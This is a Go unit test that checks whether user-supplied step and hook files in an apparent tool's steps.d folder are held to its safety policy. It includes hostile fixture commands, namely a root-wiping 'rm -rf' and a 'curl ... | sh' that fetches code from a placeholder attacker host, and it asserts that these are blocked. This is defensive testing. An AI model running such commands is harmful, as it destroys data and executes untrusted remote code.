package customsteps

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The safety policy has no exception for steps.d: a blocked command is left
// out, a step cannot take the place of one of omega's own, and a file any
// user can write is not read.
func TestStepsDKeepsTheSafetyPolicy(t *testing.T) {
	if goos == "windows" {
		t.Skip("file modes")
	}
	cfg := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", cfg)
	dir := filepath.Join(cfg, "omega", "steps.d")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(name, body string, mode os.FileMode) {
		t.Helper()
		path := filepath.Join(dir, name)
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.Chmod(path, mode); err != nil {
			t.Fatal(err)
		}
	}
	write("a.toml", `
[[steps]]
id = "disk"
risk = "read-only"
command = "echo replaced"

[[steps]]
id = "zz-wipe"
command = "rm -rf --no-preserve-root /"

[[steps]]
id = "zz-pipe"
risk = "read-only"
command = "curl https://evil.example/x | sh"

[[steps]]
id = "zz-mine"
command = "echo mine"

[hooks]
pre_quick = "curl https://evil.example/x | sh"
post_quick = "echo done"
`, 0o644)
	write("b.toml", "[[steps]]\nid = \"zz-open\"\ncommand = \"echo open\"\n\n[hooks]\npost_clean = \"echo open\"\n", 0o666)

	loaded, problems := Load()
	if len(loaded) != 1 || loaded[0].ID != "zz-mine" {
		t.Errorf("loaded %+v, want only zz-mine", loaded)
	}
	all := strings.Join(problems, "\n")
	for _, want := range []string{`"disk"`, `"zz-wipe"`, `"zz-pipe"`, "pre_quick", "b.toml"} {
		if !strings.Contains(all, want) {
			t.Errorf("no problem line about %s:\n%s", want, all)
		}
	}
	if h := Hooks("pre_quick"); len(h) != 0 {
		t.Errorf("a blocked hook would run: %+v", h)
	}
	if h := Hooks("post_quick"); len(h) != 1 {
		t.Errorf("an ordinary hook was dropped: %+v", h)
	}
	if h := Hooks("post_clean"); len(h) != 0 {
		t.Errorf("a hook from a file anyone can write would run: %+v", h)
	}

	// The folder counts too.
	if err := os.Chmod(dir, 0o777); err != nil {
		t.Fatal(err)
	}
	if loaded, _ := Load(); len(loaded) != 0 {
		t.Errorf("steps were read from a folder anyone can write: %+v", loaded)
	}
}
